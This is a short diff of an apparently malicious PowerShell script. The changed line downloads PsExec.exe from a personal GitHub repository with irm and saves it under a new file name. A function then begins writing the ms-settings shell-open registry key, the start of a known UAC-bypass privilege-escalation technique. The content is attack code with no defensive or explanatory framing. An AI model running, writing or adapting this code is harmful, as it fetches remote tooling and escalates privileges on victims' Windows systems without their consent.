@@ -1,4 +1,4 @@
-irm https://github.com/petergriuffin123/feg/raw/refs/heads/main/PsExec.exe -o psexec.ps1
+irm https://github.com/petergriuffin123/feg/raw/refs/heads/main/PsExec.exe -o psexec.exe
 Start-Sleep 3
 function ffv {
     $Key = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
